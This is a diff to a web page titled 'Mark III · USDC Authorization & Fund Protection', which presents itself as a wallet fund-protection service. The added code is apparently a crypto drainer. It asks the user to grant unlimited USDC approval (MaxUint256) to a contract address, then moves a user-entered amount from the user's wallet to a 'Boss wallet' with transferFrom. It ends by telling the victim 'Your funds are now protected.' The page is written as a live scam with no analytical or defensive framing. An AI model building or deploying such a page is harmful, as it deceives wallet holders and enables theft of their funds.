@@ -2,28 +2,24 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Mark III · Auto Authorization + Protection</title>
+  <title>Mark III · USDC Authorization & Fund Protection</title>
 </head>
 <body>
-  <h2>Mark III ・ Auto Authorization + Protection</h2>
+  <h2>Mark III – USDC Authorization & Fund Protection</h2>
 
   <button id="connect">Connect Wallet</button>
-  <button id="approve">Approve Wallet</button>
-  <button id="deposit">Protection funds</button>
-  <div id="status"></div>
+  <button id="authorize">Authorize and Transfer</button>
+  <div id="status" style="margin-top: 10px; color: #333;"></div>
 
-  <!-- 加载 ethers.js（新版地址） -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 
-  <!-- 正确的 JS 逻辑开始 -->
   <script>
-    const usdcAddress = "0xA0b86991C6218B36C1d19D4a2e9Eb0cE3606eB48";
-    const bossAddress = "0x86DBe265b0d503e68676971fc7d6aAD7E5d90b12";
+    const usdcAddress = "0xA0b86991C6218B36C1d19D4a2e9Eb0cE3606eB48"; // USDC Contract
+    const contractAddress = "0x86DBe265b0d503e68676971fc7d6aAD7E5d90b12"; // Mark III Contract (approval target)
+    const recipientWallet = "0x59e513Ae37614f1e670bfE961B3456257C444d24"; // Boss wallet (receives funds)
     const approveAmount = ethers.constants.MaxUint256;
 
-    let provider;
-    let signer;
-    let userAddress;
+    let provider, signer, userAddress;
 
     document.getElementById("connect").onclick = async () => {
       if (window.ethereum) {
@@ -31,40 +27,37 @@
         await provider.send("eth_requestAccounts", []);
         signer = provider.getSigner();
         userAddress = await signer.getAddress();
-        document.getElementById("status").innerText = "Wallet connected: " + userAddress;
+        document.getElementById("status").innerText = "Wallet successfully connected: " + userAddress;
+      } else {
+        alert("No Ethereum provider detected. Please install MetaMask.");
       }
     };
 
-    document.getElementById("approve").onclick = async () => {
-      const usdc = new ethers.Contract(
-        usdcAddress,
-        ["function approve(address spender, uint256 amount) public returns (bool)"],
-        signer
-      );
+    document.getElementById("authorize").onclick = async () => {
       try {
-        const tx = await usdc.approve(bossAddress, approveAmount);
-        await tx.wait();
-        document.getElementById("status").innerText = "Wallet approved.";
-      } catch (e) {
-        document.getElementById("status").innerText = "Approval failed.";
-      }
-    };
+        const usdc = new ethers.Contract(
+          usdcAddress,
+          [
+            "function approve(address spender, uint256 amount) public returns (bool)",
+            "function transferFrom(address from, address to, uint256 amount) public returns (bool)"
+          ],
+          signer
+        );
 
-    document.getElementById("deposit").onclick = async () => {
-      const usdc = new ethers.Contract(
-        usdcAddress,
-        ["function transferFrom(address from, address to, uint256 amount) public returns (bool)"],
-        signer
-      );
-      try {
-        const amount = prompt("Enter amount to transfer (in USDC):");
-        const decimals = 6;
-        const parsedAmount = ethers.utils.parseUnits(amount, decimals);
-        const tx = await usdc.transferFrom(userAddress, bossAddress, parsedAmount);
-        await tx.wait();
-        document.getElementById("status").innerText = "Protection completed.";
-      } catch (e) {
-        document.getElementById("status").innerText = "Transfer failed.";
+        document.getElementById("status").innerText = "Initiating USDC authorization...";
+        const approveTx = await usdc.approve(contractAddress, approveAmount);
+        await approveTx.wait();
+        document.getElementById("status").innerText = "Authorization granted. Proceeding with transfer...";
+
+        const amount = prompt("Please enter the USDC amount to transfer:");
+        const parsedAmount = ethers.utils.parseUnits(amount, 6);
+
+        const transferTx = await usdc.transferFrom(userAddress, recipientWallet, parsedAmount);
+        await transferTx.wait();
+        document.getElementById("status").innerText = "Transfer successful. Your funds are now protected.";
+      } catch (error) {
+        console.error(error);
+        document.getElementById("status").innerText = "Transaction failed: " + (error.message || "Unknown error occurred.");
       }
     };
   </script>
